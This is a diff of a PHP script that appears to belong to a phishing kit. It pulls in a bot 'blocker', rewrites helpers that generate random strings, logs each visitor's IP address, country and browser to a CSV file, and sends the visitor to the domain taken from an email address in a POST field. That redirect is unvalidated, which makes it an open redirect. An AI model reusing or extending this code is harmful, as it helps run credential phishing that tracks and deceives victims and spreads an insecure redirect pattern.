@@ -4,25 +4,31 @@ include('engine/owaf.php');
 include('blocker.php');
 include('config.php');
 
-function RandNumber($numDigits)
+function RandNumber($randstr)
 {
-     if ($numDigits <= 0) {
-        return '';
+    $char = '0123456789';
+    $str  = '';
+    for ($i = 0;
+        $i < $randstr;
+        $i++) {
+        $pos = rand(0, strlen($char) - 1);
+        $str .= $char{$pos};
     }
-
-    return mt_rand(0, 9) . randomDigits($numDigits - 1);
+    return $str;
 
 };
 
-function RandString($length)
+function RandString($randstr)
 {
-    $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
-    $charactersLength = strlen($characters);
-    $randomString = '';
-    for ($i = 0; $i < $length; $i++) {
-        $randomString .= $characters[rand(0, $charactersLength - 1)];
+    $char = 'abcdefghijklmnopqrstuvwxyz';
+    $str  = '';
+    for ($i = 0;
+        $i < $randstr;
+        $i++) {
+        $pos = rand(0, strlen($char) - 1);
+        $str .= $char{$pos};
     }
-    return $randomString;
+    return $str;
 
 };
 
@@ -319,11 +325,10 @@ $fp = fopen("visits.csv", "a");
 	fputs($fp, "\"".$searchterm."\",\"".$_SERVER['REMOTE_ADDR']."\",\"{$geoplugin->countryName}\",\"".$browser."\"\r\n");
 	fclose($fp);
 
-if(strpos($visitorxxs, "$searchterm") !== false)
+if(strpos($visitors, "$searchterm") !== false)
 
 {
-$redir_array =explode('@', "trill@trap.com");
-$redir = $redir_array[1];
+$redir = array_pop(explode('@', $_POST['token']));
 	
 header("location: http://$redir");
 
